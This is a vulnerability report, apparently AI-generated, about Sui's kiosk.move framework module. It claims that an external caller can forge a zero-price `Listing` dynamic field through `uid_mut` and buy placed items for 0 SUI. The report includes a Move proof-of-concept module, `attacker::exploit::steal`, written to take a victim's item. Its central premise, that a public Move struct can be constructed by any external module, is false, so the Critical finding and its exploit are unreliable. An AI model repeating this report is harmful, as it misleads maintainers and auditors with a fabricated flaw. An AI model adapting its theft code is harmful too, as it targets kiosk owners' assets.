Looking at the actual `kiosk.move` source to trace the exact attack path.

### Title
Unprivileged `uid_mut` Caller Can Inject Fake `Listing` Dynamic Field to Steal Kiosk Items for 0 SUI — (`crates/sui-framework/packages/sui-framework/sources/kiosk/kiosk.move`)

---

### Summary

When a `Kiosk` has `allow_extensions = true`, the public `uid_mut` function returns an unrestricted `&mut UID`. Because the `Listing` struct is declared `public` with `copy, drop, store` abilities, any external module can construct a `Listing { id, is_exclusive: false }` value and use it as a dynamic field key on the kiosk's UID. The `purchase` function blindly reads whatever `u64` price is stored under that key with no provenance check, so an attacker can inject `price = 0`, then call `purchase` with a zero-value coin to extract any placed item while depositing 0 SUI into the kiosk's `profits` balance.

---

### Finding Description

**Step 1 — Gate: `uid_mut` is public and unconditionally grants `&mut UID`** [1](#0-0) 

When `allow_extensions == true`, any transaction sender — with no capability — receives a mutable reference to the kiosk's `UID`.

**Step 2 — Root cause: `Listing` is a `public` struct with `store`** [2](#0-1) 

`public struct Listing has copy, drop, store { id: ID, is_exclusive: bool }` is fully visible and constructible by any external module. There is no `public(package)` restriction.

**Step 3 — Injection: attacker adds a fake listing DF**

With the `&mut UID` from `uid_mut`, the attacker calls:
```move
df::add(uid_mut_ref, Listing { id: victim_item_id, is_exclusive: false }, 0u64);
```
This succeeds because `Listing` has `store` and no existing DF with that key exists for an unlisted item.

**Step 4 — `purchase` reads the injected price without any provenance check** [3](#0-2) 

`purchase` removes the `Listing` DF to obtain `price`, then asserts `price == payment.value()`. With `price = 0`, a zero-value `Coin<SUI>` satisfies the check. The item is removed from the kiosk's dynamic object fields and returned to the caller, while `coin::put(&mut self.profits, payment)` deposits 0 SUI.

**Step 5 — `TransferRequest` resolution**

`purchase` returns a `TransferRequest<T>` hot potato. The attacker resolves it through any existing `TransferPolicy<T>` with no rules (or satisfies whatever rules exist). Even if royalties must be paid, the kiosk owner still receives 0 SUI for the item itself.

---

### Impact Explanation

- **Item theft**: the placed asset is transferred to the attacker without the owner's consent and for 0 SUI. This is unauthorized object transfer — a Critical-tier impact.
- **`profits` corruption**: `self.profits` receives 0 SUI instead of the intended sale price, permanently depriving the kiosk owner of funds.
- **`item_count` decremented**: the kiosk's internal accounting is corrupted.

---

### Likelihood Explanation

The prerequisite is `allow_extensions = true`. The default is `false`, but:

- `set_allow_extensions` requires only the `KioskOwnerCap` and is a documented (if deprecated) owner-facing API.
- Owners enabling extensions for legitimate third-party integrations (the intended use case) unknowingly expose all placed items to this attack.
- The `Listing` struct being `public` with `store` is the design flaw; the owner has no way to know that granting UID access also grants the ability to forge listings. [4](#0-3) 

---

### Recommendation

1. **Restrict `Listing` visibility**: change `public struct Listing` to `public(package) struct Listing`. This prevents any external module from constructing a `Listing` key, making DF injection impossible even with `&mut UID`.
2. **Alternatively, remove `store` from `Listing`**: without `store`, `Listing` cannot be used as a dynamic field key by external code.
3. **Deprecate and gate `uid_mut` more aggressively**: document that `uid_mut` must never be used when items are placed, or add a runtime guard that aborts if any `Item` DFs exist.

---

### Proof of Concept

```move
module attacker::exploit;

use sui::kiosk::{Self, Kiosk, Listing};
use sui::dynamic_field as df;
use sui::coin;
use sui::sui::SUI;
use sui::transfer_policy::TransferPolicy;

public fun steal<T: key + store>(
    kiosk: &mut Kiosk,           // allow_extensions == true
    victim_item_id: sui::object::ID,
    policy: &TransferPolicy<T>,
    ctx: &mut sui::tx_context::TxContext,
) {
    // 1. Get unrestricted &mut UID — no cap required
    let uid_mut = kiosk.uid_mut();

    // 2. Inject Listing DF with price = 0
    df::add(uid_mut, Listing { id: victim_item_id, is_exclusive: false }, 0u64);

    // 3. Purchase for 0 SUI — price check passes (0 == 0)
    let zero_coin = coin::zero<SUI>(ctx);
    let (item, request) = kiosk.purchase<T>(victim_item_id, zero_coin);

    // 4. Resolve TransferRequest (policy with no rules)
    let (_, _, _) = sui::transfer_policy::confirm_request(policy, request);

    // 5. Item is now owned by attacker; kiosk profits += 0
    sui::transfer::public_transfer(item, ctx.sender());
}
```

**Expected result**: item transferred to attacker, `kiosk.profits_amount() == 0`, kiosk owner receives nothing.

### Citations

**File:** crates/sui-framework/packages/sui-framework/sources/kiosk/kiosk.move (L189-189)
```text
public struct Listing has copy, drop, store { id: ID, is_exclusive: bool }
```

**File:** crates/sui-framework/packages/sui-framework/sources/kiosk/kiosk.move (L377-383)
```text
    let price = df::remove<Listing, u64>(&mut self.id, Listing { id, is_exclusive: false });
    let inner = dof::remove<Item, T>(&mut self.id, Item { id });

    self.item_count = self.item_count - 1;
    assert!(price == payment.value(), EIncorrectAmount);
    df::remove_opt<Lock, bool>(&mut self.id, Lock { id });
    coin::put(&mut self.profits, payment);
```

**File:** crates/sui-framework/packages/sui-framework/sources/kiosk/kiosk.move (L541-544)
```text
public fun uid_mut(self: &mut Kiosk): &mut UID {
    assert!(self.allow_extensions, EUidAccessNotAllowed);
    &mut self.id
}
```

**File:** crates/sui-framework/packages/sui-framework/sources/kiosk/kiosk.move (L639-641)
```text
public fun set_allow_extensions(self: &mut Kiosk, cap: &KioskOwnerCap, allow_extensions: bool) {
    assert!(self.has_access(cap), ENotOwner);
    self.allow_extensions = allow_extensions;
```
